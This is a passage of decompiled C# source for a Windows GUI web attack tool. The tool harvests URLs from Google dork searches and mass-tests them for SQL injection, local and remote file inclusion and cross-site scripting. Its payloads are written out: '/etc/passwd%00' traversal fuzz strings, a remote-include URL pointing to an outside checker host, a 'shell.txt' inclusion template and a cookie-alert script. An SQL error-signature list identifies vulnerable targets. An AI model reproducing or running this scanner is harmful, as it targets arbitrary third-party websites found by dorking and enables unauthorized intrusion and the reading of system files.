    }

    internal virtual RadioButton fsqli
    {
      get => this._fsqli;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._fsqli = value;
    }

    internal virtual RadioButton ssqli
    {
      get => this._ssqli;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ssqli = value;
    }

    internal virtual GroupBox GroupBox1
    {
      get => this._GroupBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._GroupBox1 = value;
    }

    internal virtual ListBox fuzzlist
    {
      get => this._fuzzlist;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._fuzzlist = value;
    }

    internal virtual ComboBox pages
    {
      get => this._pages;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._pages = value;
    }

    internal virtual Button clearb
    {
      get => this._clearb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.clearb_Click);
        if (this._clearb != null)
          this._clearb.Click -= eventHandler;
        this._clearb = value;
        if (this._clearb == null)
          return;
        this._clearb.Click += eventHandler;
      }
    }

    internal virtual TextBox dorkbox
    {
      get => this._dorkbox;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._dorkbox = value;
    }

    internal virtual Button clear2b
    {
      get => this._clear2b;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.clear2b_Click);
        if (this._clear2b != null)
          this._clear2b.Click -= eventHandler;
        this._clear2b = value;
        if (this._clear2b == null)
          return;
        this._clear2b.Click += eventHandler;
      }
    }

    internal virtual Label Label1
    {
      get => this._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual Button cloneb
    {
      get => this._cloneb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.cloneb_Click);
        if (this._cloneb != null)
          this._cloneb.Click -= eventHandler;
        this._cloneb = value;
        if (this._cloneb == null)
          return;
        this._cloneb.Click += eventHandler;
      }
    }

    internal virtual Label Label2
    {
      get => this._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label2 = value;
    }

    internal virtual Button loadb
    {
      get => this._loadb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.loadb_Click);
        if (this._loadb != null)
          this._loadb.Click -= eventHandler;
        this._loadb = value;
        if (this._loadb == null)
          return;
        this._loadb.Click += eventHandler;
      }
    }

    internal virtual Button searchb
    {
      get => this._searchb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.searchb_Click);
        if (this._searchb != null)
          this._searchb.Click -= eventHandler;
        this._searchb = value;
        if (this._searchb == null)
          return;
        this._searchb.Click += eventHandler;
      }
    }

    internal virtual Button stopb
    {
      get => this._stopb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.stopb_Click);
        if (this._stopb != null)
          this._stopb.Click -= eventHandler;
        this._stopb = value;
        if (this._stopb == null)
          return;
        this._stopb.Click += eventHandler;
      }
    }

    internal virtual Button stop2b
    {
      get => this._stop2b;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.stop2b_Click);
        if (this._stop2b != null)
          this._stop2b.Click -= eventHandler;
        this._stop2b = value;
        if (this._stop2b == null)
          return;
        this._stop2b.Click += eventHandler;
      }
    }

    internal virtual Button startb
    {
      get => this._startb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.startb_Click);
        if (this._startb != null)
          this._startb.Click -= eventHandler;
        this._startb = value;
        if (this._startb == null)
          return;
        this._startb.Click += eventHandler;
      }
    }

    internal virtual TextBox domainbox
    {
      get => this._domainbox;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._domainbox = value;
    }

    internal virtual Button saveb
    {
      get => this._saveb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.saveb_Click);
        if (this._saveb != null)
          this._saveb.Click -= eventHandler;
        this._saveb = value;
        if (this._saveb == null)
          return;
        this._saveb.Click += eventHandler;
      }
    }

    internal virtual CheckBox domain
    {
      get => this._domain;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.domain_CheckedChanged);
        if (this._domain != null)
          this._domain.CheckedChanged -= eventHandler;
        this._domain = value;
        if (this._domain == null)
          return;
        this._domain.CheckedChanged += eventHandler;
      }
    }

    internal virtual SplitContainer SplitContainer1
    {
      get => this._SplitContainer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._SplitContainer1 = value;
    }

    internal virtual ListBox chklist
    {
      get => this._chklist;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._chklist = value;
    }

    internal virtual ListBox chkdlist
    {
      get => this._chkdlist;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._chkdlist = value;
    }

    internal virtual ContextMenuStrip ContextMenuStrip1
    {
      get => this._ContextMenuStrip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ContextMenuStrip1 = value;
    }

    internal virtual ToolStripMenuItem ToolStripMenuItem1
    {
      get => this._ToolStripMenuItem1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem1_Click);
        if (this._ToolStripMenuItem1 != null)
          this._ToolStripMenuItem1.Click -= eventHandler;
        this._ToolStripMenuItem1 = value;
        if (this._ToolStripMenuItem1 == null)
          return;
        this._ToolStripMenuItem1.Click += eventHandler;
      }
    }

    internal virtual PictureBox PictureBox1
    {
      get => this._PictureBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._PictureBox1 = value;
    }

    internal virtual OpenFileDialog loader
    {
      get => this._loader;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        CancelEventHandler cancelEventHandler = new CancelEventHandler(this.loader_FileOk);
        if (this._loader != null)
          this._loader.FileOk -= cancelEventHandler;
        this._loader = value;
        if (this._loader == null)
          return;
        this._loader.FileOk += cancelEventHandler;
      }
    }

    internal virtual SaveFileDialog saver
    {
      get => this._saver;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        CancelEventHandler cancelEventHandler = new CancelEventHandler(this.saver_FileOk);
        if (this._saver != null)
          this._saver.FileOk -= cancelEventHandler;
        this._saver = value;
        if (this._saver == null)
          return;
        this._saver.FileOk += cancelEventHandler;
      }
    }

    internal virtual BackgroundWorker dorkscanner
    {
      get => this._dorkscanner;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.dorkscanner_DoWork);
        RunWorkerCompletedEventHandler completedEventHandler = new RunWorkerCompletedEventHandler(this.dorkscanner_RunWorkerCompleted);
        if (this._dorkscanner != null)
        {
          this._dorkscanner.DoWork -= workEventHandler;
          this._dorkscanner.RunWorkerCompleted -= completedEventHandler;
        }
        this._dorkscanner = value;
        if (this._dorkscanner == null)
          return;
        this._dorkscanner.DoWork += workEventHandler;
        this._dorkscanner.RunWorkerCompleted += completedEventHandler;
      }
    }

    internal virtual BackgroundWorker scnr
    {
      get => this._scnr;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.scnr_DoWork);
        RunWorkerCompletedEventHandler completedEventHandler = new RunWorkerCompletedEventHandler(this.scnr_RunWorkerCompleted);
        if (this._scnr != null)
        {
          this._scnr.DoWork -= workEventHandler;
          this._scnr.RunWorkerCompleted -= completedEventHandler;
        }
        this._scnr = value;
        if (this._scnr == null)
          return;
        this._scnr.DoWork += workEventHandler;
        this._scnr.RunWorkerCompleted += completedEventHandler;
      }
    }

    internal virtual Button proxyb
    {
      get => this._proxyb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.proxyb_Click);
        if (this._proxyb != null)
          this._proxyb.Click -= eventHandler;
        this._proxyb = value;
        if (this._proxyb == null)
          return;
        this._proxyb.Click += eventHandler;
      }
    }

    public scanner()
    {
      this.Load += new EventHandler(this.scanner_Load);
      this.Load += new EventHandler(this.xplit_Load);
      this.InitializeComponent();
    }

    private void loadb_Click(object sender, EventArgs e)
    {
      int num = (int) this.loader.ShowDialog();
    }

    private void saveb_Click(object sender, EventArgs e)
    {
      int num = (int) this.saver.ShowDialog();
    }

    private void loader_FileOk(object sender, CancelEventArgs e)
    {
      StreamReader streamReader = new StreamReader(this.loader.FileName);
      while (streamReader.Peek() > -1)
      {
        string str = streamReader.ReadLine();
        if (str.ToString().StartsWith("http://", StringComparison.CurrentCultureIgnoreCase))
          this.chklist.Items.Add((object) str);
      }
      streamReader.Close();
    }

    private void saver_FileOk(object sender, CancelEventArgs e)
    {
      StreamWriter streamWriter = new StreamWriter(this.saver.FileName);
      int num1 = 0;
      int num2 = checked (this.chkdlist.Items.Count - 1);
      int num3 = num1;
      int num4 = num2;
      int index = num3;
      while (index <= num4)
      {
        streamWriter.WriteLine(this.chkdlist.Items[index].ToString());
        checked { ++index; }
      }
      streamWriter.Close();
    }

    private void clearb_Click(object sender, EventArgs e)
    {
      this.chklist.Items.Clear();
      this.sf.Text = Conversions.ToString(0);
      this.sc.Text = Conversions.ToString(0);
    }

    private void clear2b_Click(object sender, EventArgs e)
    {
      this.chkdlist.Items.Clear();
      this.vs.Text = Conversions.ToString(0);
      this.sc.Text = Conversions.ToString(0);
    }

    private void xplit_Load(object sender, EventArgs e)
    {
      Control.CheckForIllegalCrossThreadCalls = false;
      new Thread(new ThreadStart(this.mainloader)).Start();
      this.ssqli.Checked = true;
      this.domainbox.Enabled = false;
    }

    private void domain_CheckedChanged(object sender, EventArgs e)
    {
      if (this.domain.Checked)
        this.domainbox.Enabled = true;
      else
        this.domainbox.Enabled = false;
    }

    private string getsrc(string url)
    {
      string str;
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(url);
        if (url.ToString().Contains("etc/passwd"))
          httpWebRequest.Timeout = 10000;
        HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
        string end = new StreamReader(response.GetResponseStream()).ReadToEnd();
        response.Close();
        str = end;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str = (string) null;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private void chkadder(string link)
    {
      if (this.chklist.InvokeRequired)
        this.Invoke((Delegate) new scanner._chkadder(this.chkadder), (object) link);
      else
        this.chklist.Items.Add((object) link);
    }

    public string URLDecode(string StringToDecode)
    {
      string empty = string.Empty;
      int Start = 1;
      while (checked (Start - 1) != Strings.Len(StringToDecode))
      {
        string Left = Strings.Mid(StringToDecode, Start, 1);
        if (Operators.CompareString(Left, "+", false) == 0)
          empty += " ";
        else if (Operators.CompareString(Left, "%", false) == 0)
        {
          empty += Conversions.ToString(Strings.Chr(checked ((int) Math.Round(Math.Round(Conversion.Val("&h" + Strings.Mid(StringToDecode, Start + 1, 2)))))));
          checked { Start += 2; }
        }
        else
          empty += Strings.Mid(StringToDecode, Start, 1);
        checked { ++Start; }
      }
      return empty;
    }

    private void getlnks(string src)
    {
      try
      {
        MatchCollection matchCollection = new Regex("\\bhref\\S*=\"/url\\?q=(http://\\S*?)&amp").Matches(src);
        try
        {
          IEnumerator enumerator = matchCollection.GetEnumerator();
          while (enumerator.MoveNext())
          {
            Match current = (Match) enumerator.Current;
            if (current.Groups[1].Value.ToString().StartsWith("http://", StringComparison.CurrentCultureIgnoreCase) && !(current.Groups[1].Value.ToString().Contains("www.google.com") | current.Groups[1].Value.ToString().Contains("www.youtube.com") | current.Groups[1].Value.ToString().Contains("page2rss.com")) && (this.URLDecode(current.Groups[1].Value.ToString()).Contains("=") && this.chklist.InvokeRequired))
              this.chkadder(this.URLDecode(current.Groups[1].Value.ToString()));
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        int num = (int) MessageBox.Show(ex2.Message);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    private void dorkscanner_DoWork(object sender, DoWorkEventArgs e)
    {
      int num1 = 0;
      int num2 = checked (this.pg - 1);
      int num3 = num1;
      int num4 = num2;
      int num5 = num3;
      while (num5 <= num4 && !this.dorkscanner.CancellationPending)
      {
        string url;
        if (this.domain.Checked)
          url = "https://www.google.com/search?q=" + this.dorkbox.Text + " site:" + this.domainbox.Text + "&hl=en&num=100&start=" + Conversions.ToString(num5) + "00";
        else
          url = "https://www.google.com/search?q=" + this.dorkbox.Text + "&hl=en&num=100&start=" + Conversions.ToString(num5) + "00";
        string str = this.getsrc(url);
        if (Operators.CompareString(str, (string) null, false) != 0)
          this.getlnks(str);
        checked { ++num5; }
      }
    }

    private void searchb_Click(object sender, EventArgs e)
    {
      this.dork = this.dorkbox.Text;
      this.dom = this.domainbox.Text;
      this.pg = Conversions.ToInteger(this.pages.Text);
      try
      {
        if (Operators.CompareString(this.dork, "", false) == 0)
        {
          int num1 = (int) MessageBox.Show("PLease enter the dork", "Dork Missing", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        else if (this.domain.Checked & Operators.CompareString(this.dom, "", false) == 0)
        {
          int num2 = (int) MessageBox.Show("PLease mention the domain", "Domain Missing", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        else
        {
          try
          {
            IEnumerator enumerator = this.GroupBox1.Controls.GetEnumerator();
            while (enumerator.MoveNext())
            {
              Control current = (Control) enumerator.Current;
              if (Operators.CompareString(current.Name, "stopb", false) != 0)
                current.Enabled = false;
            }
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
          this.dorkscanner.RunWorkerAsync();
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        int num = (int) MessageBox.Show(ex2.Message);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    private void dorkscanner_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
      try
      {
        IEnumerator enumerator = this.GroupBox1.Controls.GetEnumerator();
        while (enumerator.MoveNext())
        {
          Control current = (Control) enumerator.Current;
          if (Operators.CompareString(current.Name, "stopb", false) != 0 & Operators.CompareString(current.Name, "proxyb", false) != 0)
            current.Enabled = true;
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      this.ProgressBar1.Maximum = this.chklist.Items.Count;
      this.sf.Text = Conversions.ToString(this.chklist.Items.Count);
      this.vs.Text = Conversions.ToString(this.chkdlist.Items.Count);
    }

    private void stopb_Click(object sender, EventArgs e)
    {
      if (!this.dorkscanner.IsBusy)
        return;
      this.dorkscanner.CancelAsync();
    }

    private void cloneb_Click(object sender, EventArgs e)
    {
      List<string> stringList = new List<string>();
      int num1 = 0;
      int num2 = checked (this.chklist.Items.Count - 1);
      int num3 = num1;
      int num4 = num2;
      int index1 = num3;
      while (index1 <= num4)
      {
        int num5 = checked (index1 + 1);
        int num6 = checked (this.chklist.Items.Count - 1);
        int num7 = num5;
        int num8 = num6;
        int index2 = num7;
        while (index2 <= num8)
        {
          if (this.chklist.Items[index2].ToString().ToLower().Split('.').GetValue(1).ToString().Contains(this.chklist.Items[index1].ToString().ToLower().Split('.').GetValue(1).ToString()) && !stringList.Contains(Conversions.ToString(RuntimeHelpers.GetObjectValue(this.chklist.Items[index2]))))
            stringList.Add(Conversions.ToString(RuntimeHelpers.GetObjectValue(this.chklist.Items[index2])));
          checked { ++index2; }
        }
        checked { ++index1; }
      }
      try
      {
        foreach (object obj in stringList)
          this.chklist.Items.Remove(obj);
      }
      finally
      {
        List<string>.Enumerator enumerator;
        ((IDisposable) enumerator).Dispose();
      }
      stringList.Clear();
      this.ProgressBar1.Maximum = this.chklist.Items.Count;
      this.sf.Text = Conversions.ToString(this.chklist.Items.Count);
      this.vs.Text = Conversions.ToString(this.chkdlist.Items.Count);
    }

    private void stop2b_Click(object sender, EventArgs e)
    {
      if (!this.scnr.IsBusy)
        return;
      this.scnr.CancelAsync();
    }

    private void startb_Click(object sender, EventArgs e)
    {
      try
      {
        IEnumerator enumerator = this.GroupBox1.Controls.GetEnumerator();
        while (enumerator.MoveNext())
        {
          Control current = (Control) enumerator.Current;
          if (Operators.CompareString(current.Name, "stop2b", false) != 0)
            current.Enabled = false;
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      try
      {
        IEnumerator enumerator = this.GroupBox2.Controls.GetEnumerator();
        while (enumerator.MoveNext())
          ((Control) enumerator.Current).Enabled = false;
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      this.scnr.RunWorkerAsync();
    }

    private void progadder(int value)
    {
      if (this.ProgressBar1.InvokeRequired)
        this.Invoke((Delegate) new scanner.progadd(this.progadder), (object) value);
      else
        checked { ++this.ProgressBar1.Value; }
    }

    private void scnr_DoWork(object sender, DoWorkEventArgs e)
    {
      try
      {
        if (this.ssqli.Checked)
        {
          this.sf.Text = Conversions.ToString(this.chklist.Items.Count);
          this.progmax(this.chklist.Items.Count);
          this.ProgressBar1.Value = 0;
          try
          {
            IEnumerator enumerator = this.chklist.Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
              object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator.Current)));
              if (!this.scnr.CancellationPending)
              {
                string str = this.getsrc(objectValue.ToString().Replace("=", "='").ToString());
                if (Operators.CompareString(str, (string) null, false) != 0 && this.esqli(str))
                {
                  this.chkdadder(objectValue.ToString());
                  ToolStripStatusLabel vs = this.vs;
                  vs.Text = Conversions.ToString(Conversions.ToDouble(vs.Text) + 1.0);
                }
                this.progadder((uint) checked (-unchecked (this.ProgressBar1.Value == checked (this.ProgressBar1.Value + 1) ? 1 : 0 < 0) ? 1 : 0) > 0U ? 1 : 0);
                ToolStripStatusLabel sc = this.sc;
                sc.Text = Conversions.ToString(Conversions.ToDouble(sc.Text) + 1.0);
              }
              else
                break;
            }
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
        }
        if (this.lfi.Checked)
        {
          this.sf.Text = Conversions.ToString(this.chklist.Items.Count);
          this.progmax(this.chklist.Items.Count);
          this.ProgressBar1.Value = 0;
          try
          {
            IEnumerator enumerator = this.chklist.Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
              object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator.Current)));
              if (!this.scnr.CancellationPending)
              {
                string str = this.getsrc((objectValue.ToString().Split('=').GetValue(0).ToString() + "=").ToString().Replace("=", "=Gr3eNoXchker.php%00"));
                if (Operators.CompareString(str, (string) null, false) != 0 && this.elfi(str))
                {
                  this.chkdadder((objectValue.ToString().Split('=').GetValue(0).ToString() + "=").ToString().Replace("=", "=/etc/passwd%00"));
                  ToolStripStatusLabel vs = this.vs;
                  vs.Text = Conversions.ToString(Conversions.ToDouble(vs.Text) + 1.0);
                }
                this.progadder((uint) checked (-unchecked (this.ProgressBar1.Value == checked (this.ProgressBar1.Value + 1) ? 1 : 0 < 0) ? 1 : 0) > 0U ? 1 : 0);
                ToolStripStatusLabel sc = this.sc;
                sc.Text = Conversions.ToString(Conversions.ToDouble(sc.Text) + 1.0);
              }
              else
                break;
            }
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
        }
        if (this.lfifuzz.Checked)
        {
          this.sf.Text = Conversions.ToString(this.chklist.Items.Count);
          this.progmax(this.chklist.Items.Count);
          this.ProgressBar1.Value = 0;
          try
          {
            IEnumerator enumerator1 = this.chklist.Items.GetEnumerator();
            while (enumerator1.MoveNext())
            {
              object objectValue1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator1.Current)));
              try
              {
                IEnumerator enumerator2 = this.fuzzlist.Items.GetEnumerator();
                while (enumerator2.MoveNext())
                {
                  object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator2.Current)));
                  if (!this.scnr.CancellationPending)
                  {
                    string str = this.getsrc((objectValue1.ToString().Split('=').GetValue(0).ToString() + "=").ToString().Replace("=", objectValue2.ToString()));
                    if (Operators.CompareString(str, (string) null, false) != 0 && this.efuzzlfi(str))
                    {
                      this.chkdadder((objectValue1.ToString().Split('=').GetValue(0).ToString() + "=").ToString().Replace("=", objectValue2.ToString()));
                      ToolStripStatusLabel vs = this.vs;
                      vs.Text = Conversions.ToString(Conversions.ToDouble(vs.Text) + 1.0);
                      break;
                    }
                    ToolStripStatusLabel fs = this.fs;
                    fs.Text = Conversions.ToString(Conversions.ToDouble(fs.Text) + 1.0);
                  }
                  else
                    break;
                }
              }
              finally
              {
                IEnumerator enumerator2;
                if (enumerator2 is IDisposable)
                  (enumerator2 as IDisposable).Dispose();
              }
              this.progadder((uint) checked (-unchecked (this.ProgressBar1.Value == checked (this.ProgressBar1.Value + 1) ? 1 : 0 < 0) ? 1 : 0) > 0U ? 1 : 0);
              ToolStripStatusLabel sc = this.sc;
              sc.Text = Conversions.ToString(Conversions.ToDouble(sc.Text) + 1.0);
              this.fs.Text = Conversions.ToString(0);
            }
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
        }
        if (this.rfi.Checked)
        {
          this.sf.Text = Conversions.ToString(this.chklist.Items.Count);
          this.progmax(this.chklist.Items.Count);
          this.ProgressBar1.Value = 0;
          try
          {
            IEnumerator enumerator = this.chklist.Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
              object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator.Current)));
              if (!this.scnr.CancellationPending)
              {
                string str = this.getsrc((objectValue.ToString().Split('=').GetValue(0).ToString() + "=").ToString().Replace("=", "=http://gr3enox.net23.net/Checker.php%00"));
                if (Operators.CompareString(str, (string) null, false) != 0 && this.erfi(str))
                {
                  this.chkdadder((objectValue.ToString().Split('=').GetValue(0).ToString() + "=").ToString().Replace("=", "=http://www.site.com/shell.txt?%00"));
                  ToolStripStatusLabel vs = this.vs;
                  vs.Text = Conversions.ToString(Conversions.ToDouble(vs.Text) + 1.0);
                }
                this.progadder((uint) checked (-unchecked (this.ProgressBar1.Value == checked (this.ProgressBar1.Value + 1) ? 1 : 0 < 0) ? 1 : 0) > 0U ? 1 : 0);
                ToolStripStatusLabel sc = this.sc;
                sc.Text = Conversions.ToString(Conversions.ToDouble(sc.Text) + 1.0);
              }
              else
                break;
            }
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
        }
        if (!this.xss.Checked)
          return;
        this.sf.Text = Conversions.ToString(this.chklist.Items.Count);
        this.progmax(this.chklist.Items.Count);
        this.ProgressBar1.Value = 0;
        try
        {
          IEnumerator enumerator = this.chklist.Items.GetEnumerator();
          while (enumerator.MoveNext())
          {
            object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator.Current)));
            if (this.scnr.CancellationPending)
              break;
            string src = this.getsrc(objectValue.ToString() + "\"><script>alert(document.cookie)</script>");
            if (src != null && this.exss(src))
            {
              this.chkdadder(objectValue.ToString());
              ToolStripStatusLabel vs = this.vs;
              vs.Text = Conversions.ToString(Conversions.ToDouble(vs.Text) + 1.0);
            }
            this.progadder((uint) checked (-unchecked (this.ProgressBar1.Value == checked (this.ProgressBar1.Value + 1) ? 1 : 0 < 0) ? 1 : 0) > 0U ? 1 : 0);
            ToolStripStatusLabel sc = this.sc;
            sc.Text = Conversions.ToString(Conversions.ToDouble(sc.Text) + 1.0);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        int num = (int) MessageBox.Show(ex2.Message);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    private void chkdadder(string link)
    {
      if (this.chkdlist.InvokeRequired)
        this.Invoke((Delegate) new scanner._chkdadder(this.chkdadder), (object) link);
      else
        this.chkdlist.Items.Add((object) link.ToString());
    }

    private bool esqli(string src)
    {
      bool flag;
      try
      {
        IEnumerator enumerator = this.sqlerrlist.Items.GetEnumerator();
        while (enumerator.MoveNext())
        {
          string str = Conversions.ToString(RuntimeHelpers.GetObjectValue(enumerator.Current));
          if (src.Contains(str.ToString()))
          {
            flag = true;
            break;
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return flag;
    }

    private void mainloader()
    {
      this.sqlerrlist.Items.Add((object) "mysql_num_rows()");
      this.sqlerrlist.Items.Add((object) "mysql_fetch_array()");
      this.sqlerrlist.Items.Add((object) "Error Occurred While Processing Request");
      this.sqlerrlist.Items.Add((object) "Server Error in '/' Application");
      this.sqlerrlist.Items.Add((object) "Microsoft OLE DB Provider for ODBC Drivers error");
      this.sqlerrlist.Items.Add((object) "error in your SQL syntax");
      this.sqlerrlist.Items.Add((object) "Invalid Querystring");
      this.sqlerrlist.Items.Add((object) "OLE DB Provider for ODBC");
      this.sqlerrlist.Items.Add((object) "VBScript Runtime");
      this.sqlerrlist.Items.Add((object) "ADODB.Field");
      this.sqlerrlist.Items.Add((object) "BOF or EOF");
      this.sqlerrlist.Items.Add((object) "ADODB.Command");
      this.sqlerrlist.Items.Add((object) "mysql_fetch_row()");
      this.sqlerrlist.Items.Add((object) "Syntax error");
      this.sqlerrlist.Items.Add((object) "include()");
      this.sqlerrlist.Items.Add((object) "mysql_fetch_assoc()");
      this.sqlerrlist.Items.Add((object) "mysql_fetch_object()");
      this.sqlerrlist.Items.Add((object) "mysql_numrows()");
      this.sqlerrlist.Items.Add((object) "GetArray()");
      this.sqlerrlist.Items.Add((object) "FetchRow()");
      this.sqlerrlist.Items.Add((object) "Input string was not in a correct format");
      this.sqlerrlist.Items.Add((object) "There was an error querying the database");
      this.sqlerrlist.Items.Add((object) "[SQLServer JDBC Driver]");
      this.sqlerrlist.Items.Add((object) "this page cannot be displayed");
      this.sqlerrlist.Items.Add((object) "fetch_row");
      this.sqlerrlist.Items.Add((object) "DatbaseQueryException");
      this.sqlerrlist.Items.Add((object) "coldfusion.tagext");
      this.sqlerrlist.Items.Add((object) "error in your SQL syntax");
      this.sqlerrlist.Items.Add((object) "mysql_result(");
      this.sqlerrlist.Items.Add((object) "supplied argument is not a valid MySQL result");
      this.sqlerrlist.Items.Add((object) "mysql_fetch_array");
      this.sqlerrlist.Items.Add((object) "sql_numrows(");
      this.sqlerrlist.Items.Add((object) "call to undefined function");
      this.sqlerrlist.Items.Add((object) "mysql_result(");
      this.sqlerrlist.Items.Add((object) "supplied argument is not a valid MySQL result");
      this.sqlerrlist.Items.Add((object) "mysql_fetch_array");
      this.sqlerrlist.Items.Add((object) "sql_numrows(");
      this.sqlerrlist.Items.Add((object) "fetchrow(");
      this.sqlerrlist.Items.Add((object) "][ODBC Socket]");
      this.sqlerrlist.Items.Add((object) "][ODBC");
      this.sqlerrlist.Items.Add((object) "Error Executing Database Query");
      this.sqlerrlist.Items.Add((object) "SequeLink JDBC Driver");
      this.sqlerrlist.Items.Add((object) "Microsoft OLE DB");
      this.sqlerrlist.Items.Add((object) "error '80040e14'");
      this.sqlerrlist.Items.Add((object) "Provider for ODBC Drivers");
      this.sqlerrlist.Items.Add((object) "java.sql.SQLException");
      this.sqlerrlist.Items.Add((object) "VENDORERRORCODE");
      this.sqlerrlist.Items.Add((object) "</CFQUERY>");
      this.sqlerrlist.Items.Add((object) "Microsoft VBScript runtime error '800a000d'");
      this.sqlerrlist.Items.Add((object) "Type mismatch:");
      this.sqlerrlist.Items.Add((object) "error '800a000d'");
      this.sqlerrlist.Items.Add((object) "Microsoft VBScript runtime");
      this.sqlerrlist.Items.Add((object) "Microsoft OLE DB Provider for SQL Server");
      this.sqlerrlist.Items.Add((object) "error '80040e14");
      this.sqlerrlist.Items.Add((object) "Unclosed quotation mark after the character string");
      this.sqlerrlist.Items.Add((object) "Type mismatch: '[string: &quot;'37937&quot;]'");
      this.sqlerrlist.Items.Add((object) "Microsoft VBScript runtime");
      this.sqlerrlist.Items.Add((object) "Microsoft VBScript runtime");
      this.fuzzlist.Items.Add((object) "=../etc/passwd%00");
      this.fuzzlist.Items.Add((object) "=../../etc/passwd%00");
      this.fuzzlist.Items.Add((object) "=../../../etc/passwd%00");
      this.fuzzlist.Items.Add((object) "=../../../../etc/passwd%00");
      this.fuzzlist.Items.Add((object) "=../../../../../etc/passwd%00");
      this.fuzzlist.Items.Add((object) "=../../../../../../etc/passwd%00");
      this.fuzzlist.Items.Add((object) "=../../../../../../../etc/passwd%00");
